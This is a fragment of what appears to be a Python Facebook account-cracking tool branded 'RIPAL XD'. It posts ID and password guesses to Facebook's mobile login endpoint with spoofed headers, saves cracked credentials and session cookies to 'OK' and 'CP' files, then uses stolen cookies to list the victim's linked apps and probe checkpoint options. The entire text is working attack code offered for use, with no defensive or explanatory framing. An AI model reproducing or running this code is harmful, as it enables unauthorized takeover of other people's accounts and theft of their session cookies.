			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'd5+gt97uzFsilGeOlLn7V7WTyVqH5NYXGvxL6rmEFhkXVZbptZ0pxbt4wCo7DtnVZZCUMJN9t6ExJK0RphG7kw==','content-length': '1700','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1169836009752131&kid_directed_site=0&app_id=1169836009752131&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.5%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26client_id%3D1169836009752131%26redirect_uri%3Dhttps%253A%252F%252Ftees.co.id%252F%26display%3Dpopup%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddf7a7932-3c56-46eb-8b8e-92236de08051%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftees.co.id%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=366497233413324&auth_token=cccf35acde75d5e0634afd87ad7b46a4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D366497233413324%26redirect_uri%3Dhttps%253A%252F%252Fwww.99.co%252Fid%252Fapi%252Fbiz%252Fauth%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De6ee5c4f-e11f-4a4d-bfd8-22c1beda2874%26tp%3Dunspecified&refsrc=deprecated&app_id=366497233413324&cancel=https%3A%2F%2Fwww.99.co%2Fid%2Fapi%2Fbiz%2Fauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=101',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='RIPAL XD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='RIPAL XD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] USERAGENT : {ua} '
					statusok1 = nel(statusok, width=90, style='bold green', title='RIPAL XD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] USERAGENT : {ua} '
					statusok1 = nel(statusok, width=90, style='bold green', title='RIPAL XD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m%s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print("[bold white]"+cek[opsi]))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')                              
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('pot-OK')
	except:pass
	try:os.mkdir('pot-CP')
	except:pass
	try:os.system('clear')
	except:pass
	menu()